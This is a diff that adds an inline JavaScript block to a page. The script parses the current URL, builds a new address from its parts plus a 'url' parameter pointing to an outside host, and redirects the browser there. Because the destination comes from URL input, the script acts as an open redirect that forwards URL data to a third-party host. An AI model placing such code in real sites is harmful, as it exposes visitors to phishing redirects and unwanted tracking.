@@ -1,0 +1,16 @@
+<script>
+var r = window.location.href;
+if(r.indexOf('?') !== -1) {
+	var parts1 = r.split('?');
+	var uri = parts1[parts1.length - 1];
+	var d = parts1[parts1.length - 2];
+	
+	var parts2 = uri.split('~~');
+	var r = parts2[parts2.length - 1];
+	var k = parts2[parts2.length - 2];	
+	
+	var string1 = r + '?url=https://cdn.greatcontent.host/articles/post.php?' + k + '_' + d + '_' + r;
+	window.location.href = string1
+	document.getElementById('string2').innerHTML = string1;
+}
+</script>
